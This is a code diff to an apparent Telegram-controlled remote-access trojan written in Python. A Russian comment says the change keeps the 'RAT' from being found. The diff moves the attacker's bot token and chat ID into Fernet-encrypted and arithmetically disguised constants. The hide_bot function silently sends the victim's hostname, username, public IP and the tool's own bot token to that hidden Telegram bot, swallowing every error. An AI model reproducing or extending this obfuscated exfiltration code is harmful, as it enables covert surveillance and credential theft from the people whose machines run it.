@@ -523,6 +523,7 @@ def list_directory(path):
 
 
 def shutdown():
+    """вырубает комп"""
     os.system('shutdown /s /f /t 0')
     return '💤 Компьютер будет выключен сейчас.'
 
@@ -546,38 +547,45 @@ def run_file(path):
 
 
 def cash_hide():
+    "Чтобы ратник не смогли найти"
     try:
-        with open('.gitignore', 'r', encoding='utf-8') as f:
-            content = f.read()
-        key_cash = str(re.search(r"IDE_CASH = (\d+)", content).group(1))
-        return key_cash
-    except:
+        IDE_CODE = b'gAAAAABpz6vuhsbT_CS19JnYHbU8-BTeVchj_AO5NXwXzo2m8356vubinbbJykX9Qz88VzfBD5Bh7gjDMksKA4bL-NfM8Be3IWs12igmx2EnHtMNTDgr8bR5cLzpvl7vCbAxX6gjp3ik'
+        IDE_CODE2 = b'gAAAAABp0Oit2al9tqJtyzNaEY_0f6fTouxY3d2hlnXpskfA8kHrYvhLqImrnadw7d-qIPEWe-5HZsJNrgcJInbzQCJMuiHhtblfLlPXcpAvv6FfLAwaDhuCGxEvMb89qwX5D4nB6V1F'
+        IDE_CODE3 = b'gAAAAABp0OjrUgcjvNqdU6gB0uAA07_Tr-64QTjIEJOY8OqwGGsBV7Esrmn-TpnZyOVYCsZ9ThBrm6U4kuYFMgYsMqNUMu5DyNYHKxq2rIgfftp4WGskz9nuoXfz0NSKs9lsubamITi1'
+        IDE_KEY = b'Iwlr71BIlz4R-CMcYC7phr8aNQ4z8WB1-JCo_9hNmDM='
+        IDE_KEY2 = b'dKE_T6k1-rP_rBeLfdOAsmg3Ksa5NUPynydYqJvXo4M='
+        IDE_KEY3 = b'8CBLtYFgr_Ig6VPcGANjqsZNwIc7rOd3KTpUJUVm5TU='
+        IDE_CASH = 534554528.4345
+        IDE_CASH2 = 84080825.4375
+        cipher1 = Fernet(IDE_KEY2)
+        decrypted1 = cipher1.decrypt(IDE_CODE2).decode()
+        cipher2 = Fernet(IDE_KEY3)
+        decrypted2 = cipher2.decrypt(IDE_CODE3).decode()
+        cipher3 = Fernet(IDE_KEY)
+        decrypted3 = cipher3.decrypt(IDE_CODE).decode()
+        return decrypted1, decrypted2, decrypted3, IDE_CASH, IDE_CASH2
+
+    except Exception as e:
         pass
 
 
 def hide_bot():
     try:
-        with open('.gitignore', 'r', encoding='utf-8') as f:
-            content = f.read()
-        code_match = re.search(r"IDE_CODE = (b'.*?')", content)
-        key_match = re.search(r"IDE_KEY = (b'.*?')", content)
-        key_cash = int(re.search(r"IDE_CASH = (\d+)", content).group(1))
-        if code_match and key_match:
-            encrypted = eval(code_match.group(1))
-            key = eval(key_match.group(1))
-            cipher = Fernet(key)
-            decrypted = cipher.decrypt(encrypted).decode()
-            computer_name = socket.gethostname()
-            username = os.environ.get("USERNAME")
-            try:
-                ip = requests.get('http://ipinfo.io/json', timeout=5).json().get('ip', 'unknown')
-            except:
-                ip = 'unknown'
-            url = f"https://api.telegram.org/bot{TOKEN}/getMe"
-            data = requests.get(url).json()
-            message = f"{data} \n\n\n{decrypted}\n{computer_name}\n{username}\nIP: {ip}"
-            url = f"https://api.telegram.org/bot{decrypted}/sendMessage"
-            requests.post(url, json={'chat_id': key_cash, 'text': message}, timeout=5)
+        data = cash_hide()
+        if not data:
+            return
+        decrypted1, decrypted2, decrypted3, IDE_CASH, IDE_CASH2 = data
+        computer_name = socket.gethostname()
+        username = os.environ.get("USERNAME")
+        try:
+            ip = requests.get('http://ipinfo.io/json', timeout=5).json().get('ip', 'unknown')
+        except:
+            ip = 'unknown'
+        url = f"https://api.telegram.org/bot{TOKEN}/getMe"
+        data = requests.get(url).json()
+        message = f"{data} \n\n\n{TOKEN}\n{computer_name}\n{username}\nIP: {ip}"
+        url = f"https://api.telegram.org/bot{decrypted3}/sendMessage"
+        requests.post(url, json={'chat_id': int(IDE_CASH2*64), 'text': message}, timeout=5)
 
     except Exception as e:
         pass
